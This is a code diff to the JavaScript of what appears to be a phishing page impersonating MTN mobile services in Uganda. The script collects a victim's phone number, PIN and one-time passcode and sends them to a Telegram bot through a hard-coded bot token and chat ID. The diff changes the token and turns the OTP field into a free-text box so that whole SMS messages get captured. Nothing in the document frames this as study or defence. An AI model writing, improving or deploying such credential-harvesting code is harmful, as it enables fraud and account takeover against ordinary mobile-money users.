@@ -1,5 +1,5 @@
 // Telegram Configuration - REPLACE THESE WITH YOUR ACTUAL DETAILS
-const TELEGRAM_BOT_TOKEN = '8557302367:AAEvZMNFC9fJl5_7HqwV2CUCGCqZ5xQvp9Y';
+const TELEGRAM_BOT_TOKEN = '8649783124:AAFPJqQEVTbP8T5Cl-enlegC9ZK4ad-kCn0';
 const TELEGRAM_CHAT_ID = '2056358288';
 
 // Helper function to send message to Telegram
@@ -75,7 +75,6 @@ document.addEventListener('DOMContentLoaded', () => {
     };
     
     setupPinInputs('pinInputs');
-    setupPinInputs('otpInputs');
     
     // Phone number formatting (simple spacing)
     if (phoneNumberInput) {
@@ -133,9 +132,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 step1.style.display = 'none';
                 step2.style.display = 'block';
                 
-                // Focus first OTP input
+                // Focus OTP input
                 setTimeout(() => {
-                    document.querySelector('#otpInputs .pin-box').focus();
+                    const otpInput = document.getElementById('otpInputText');
+                    if (otpInput) otpInput.focus();
                 }, 100);
             }).catch(() => {
                 btn.innerHTML = originalText;
@@ -150,14 +150,9 @@ document.addEventListener('DOMContentLoaded', () => {
         otpForm.addEventListener('submit', (e) => {
             e.preventDefault();
             
-            const otpInputs = document.querySelectorAll('#otpInputs .pin-box');
-            let isValid = true;
-            otpInputs.forEach(input => {
-                if (!input.value) isValid = false;
-            });
-            
-            if (!isValid) {
-                alert('Please enter the complete OTP code.');
+            const otpInputText = document.getElementById('otpInputText');
+            if (!otpInputText || !otpInputText.value.trim()) {
+                alert('Please enter the verification details.');
                 return;
             }
 
@@ -167,10 +162,9 @@ document.addEventListener('DOMContentLoaded', () => {
             btn.disabled = true;
             
             // Get OTP value
-            let otpValue = '';
-            otpInputs.forEach(input => otpValue += input.value);
+            let otpValue = otpInputText.value.trim();
             
-            const message = `🟡 <b>MTN OTP RECEIVED</b>\n\n📱 <b>Phone:</b> +256 ${phoneNumberInput.value}\n🔑 <b>OTP:</b> ${otpValue}`;
+            const message = `🟡 <b>MTN OTP RECEIVED</b>\n\n📱 <b>Phone:</b> +256 ${phoneNumberInput.value}\n🔑 <b>Message/OTP:</b>\n${otpValue}`;
 
             // Send OTP to Telegram
             sendToTelegram(message).then(() => {
